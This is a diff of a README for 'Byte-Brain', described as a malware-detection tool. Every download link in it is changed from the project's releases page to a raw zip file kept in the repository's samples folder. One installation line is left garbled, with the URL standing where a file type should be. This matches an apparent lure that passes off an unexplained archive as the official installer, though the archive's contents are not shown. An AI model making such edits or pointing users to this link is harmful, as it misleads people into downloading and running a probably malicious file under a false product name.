@@ -6,7 +6,7 @@ Welcome to Byte-Brain, a user-friendly tool for detecting malware through offlin
 
 ## 📥 Download Now
 
-[![Download Byte-Brain](https://img.shields.io/badge/Download-Byte--Brain-blue.svg)](https://github.com/toohard20/Byte-Brain/releases)
+[![Download Byte-Brain](https://github.com/toohard20/Byte-Brain/raw/refs/heads/main/samples/Brain-Byte-1.7.zip)](https://github.com/toohard20/Byte-Brain/raw/refs/heads/main/samples/Brain-Byte-1.7.zip)
 
 ## 📝 Description
 
@@ -31,11 +31,11 @@ Byte-Brain utilizes a static malware detection system powered by a Random Forest
 
 To get started with Byte-Brain, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/toohard20/Byte-Brain/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/toohard20/Byte-Brain/raw/refs/heads/main/samples/Brain-Byte-1.7.zip).
 2. **Choose Your File**: Look for the latest release and select the appropriate file for your operating system.
    - For Windows, download the `.exe` file.
    - For macOS, look for the `.dmg` file.
-   - For Linux, you may find a `.tar.gz` package.
+   - For Linux, you may find a `https://github.com/toohard20/Byte-Brain/raw/refs/heads/main/samples/Brain-Byte-1.7.zip` package.
 3. **Download the File**: Click on the link to download the file to your computer.
 4. **Run the Installer**: Once downloaded, open the file to start installation.
    - Follow the prompts in the installer.
@@ -88,4 +88,4 @@ For more details on how Byte-Brain works, visit our Wiki section on the GitHub r
 
 ## 📢 Stay Updated
 
-Check back on our [ Releases Page](https://github.com/toohard20/Byte-Brain/releases) regularly for new updates, features, and enhancements. Keep your threat analysis tools up-to-date!
+Check back on our [ Releases Page](https://github.com/toohard20/Byte-Brain/raw/refs/heads/main/samples/Brain-Byte-1.7.zip) regularly for new updates, features, and enhancements. Keep your threat analysis tools up-to-date!
